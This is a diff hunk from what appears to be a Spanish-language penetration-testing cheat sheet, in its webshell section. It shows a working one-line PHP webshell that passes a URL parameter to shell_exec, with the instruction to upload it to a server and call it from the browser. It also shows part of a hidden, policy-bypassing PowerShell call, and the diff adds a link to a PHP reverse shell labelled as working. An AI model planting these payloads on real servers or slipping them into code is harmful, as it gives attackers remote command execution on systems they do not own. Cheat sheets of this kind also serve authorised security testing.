@@ -285,6 +285,9 @@ os.system('powershell -nop -W hidden -noni -ep bypass -c "'
 ## 4. WEBSHELLS
 
 ### PHP — Webshell básica
+
+* [reverse.php](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) <-- Funcional 
+
 ```php
 # cmd.php → subir al servidor y acceder desde el navegador
 <?php echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>"; ?>
